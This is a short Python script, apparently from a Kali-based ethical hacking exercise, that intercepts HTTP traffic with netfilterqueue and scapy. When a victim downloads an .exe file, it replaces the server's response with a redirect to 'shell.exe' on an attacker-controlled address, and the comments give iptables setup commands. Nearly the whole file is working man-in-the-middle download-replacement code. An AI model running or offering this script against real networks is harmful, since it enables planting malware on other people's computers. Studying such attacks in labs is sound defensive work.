#!/usr/bin/env python3
import argparse
import scapy.all as scapy
import netfilterqueue


# Kali Commands:
# iptables -I FORWARD -j NFQUEUE --queue-num 0  # For forwarded (remote machine) packet testing
# sudo apt install libnetfilter-queue-dev libnetfilter-queue1
# pip3 install netfilterqueue
# iptables --flush  # Once finished with packet interception


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-q", "--queue-number", dest="queue_number", help="Setup via the iptables --queue-num switch)")
    options = parser.parse_args()
    if not options.queue_number:
        parser.error("[-] Please specify a queue number, see --help for more info.")
    return options


ack_list = []


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in str(scapy_packet[scapy.Raw].load):
                print("[+] .exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file..")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://10.222.111.228/shell.exe\n\n"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(bytes(scapy_packet))
    packet.accept()  # Forwards packets
    # packet.drop()  # Drops packets


options = get_arguments()
print("[+] Initiating HTTP Modifier..")
print("[+] Setting up NetfilterQueue..")
queue = netfilterqueue.NetfilterQueue()
queue.bind(int(options.queue_number), process_packet)
print("[+] Monitoring HTTP packets on queue " + str(options.queue_number) + "..")
queue.run()

